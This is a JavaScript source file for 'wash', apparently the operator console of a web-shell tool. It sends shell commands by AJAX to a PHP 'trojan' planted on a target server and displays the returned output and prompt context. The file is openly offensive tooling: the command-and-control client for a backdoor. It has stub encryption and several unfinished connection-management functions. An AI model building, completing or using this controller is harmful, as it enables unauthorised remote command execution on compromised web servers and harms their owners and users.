// this is the top-level application object
// @todo: remember to segregate wash into a local and remote namespace pair
var wash = {

    // store the version number (sometimes this is handy)
    version: '1.0.0',

    command: {

        obj: new Command(),

        // encrypts a command before sending to the trojan
        encrypt: function(){
            return true;
        },

        // decrypts a command before sending to the trojan
        decrypt: function(){
            return true;
        },

        // processes commands on the wash prompt
        process: function(command){
            // build the command object
            wash.command.obj.cmd  = command;
            wash.command.obj.type = shell.prompt.mode.get();
            // process wash command arguments if appropriate
            if(wash.command.obj.type == 'wash'){
                console.log('@todo: process arguments here');
            }

            // encrypt and send the command object
            wash.command.encrypt();
            wash.command.send();
        },

        // sends a command to the trojan
        send: function(){
            // make the AJAX request to the trojan
            $.ajax({
                type : wash.target.request_type,
                url  : wash.target.protocol + '://' + wash.target.url,
                data : wash.command.obj,
            }).done(function(response){
                wash.response.obj = JSON.parse(response);
                // this has to go here rather than in command.process because
                // it is a callback that will be processed asynchronously
                wash.response.output();
            });
        }
    },

    response: {
        // this is a buffer for the response from the trojan
        obj: new Response(),

        // outputs response data to the wash interface
        output: function(){
            //decrypt here
            shell.prompt.context.set(wash.response.obj.prompt_context);
            shell.output.write(wash.response.obj.output , 'output');
        },
    },

    // target parameters
    target: {
        // @todo: I'm hard-coding these while I'm debugging
        protocol     : 'http',
        url          : 'wash/trojans/plaintext/trojan.php',
        port         : '80',
        password     : '',
        request_type : 'post',

        // manage connections
        connection: {
            // loads a saved connection
            load: function(){
                console.log('TODO: implement this.');
            },

            // saves a connection
            save: function(){
                console.log('TODO: implement this.');
            },

            // saves a connection under a new name
            saveas: function(){
                console.log('TODO: implement this.');
            },

            // sets the connection parameters
            set: function(){
                console.log('TODO: implement this.');
            },

            // updates a target parameter
            update: function(parameter, value){
                wash.target[parameter] = value;
                shell.status.set('wash.target.' + parameter + ' has been set to ' + value + '.');
            },
        },
    },
}
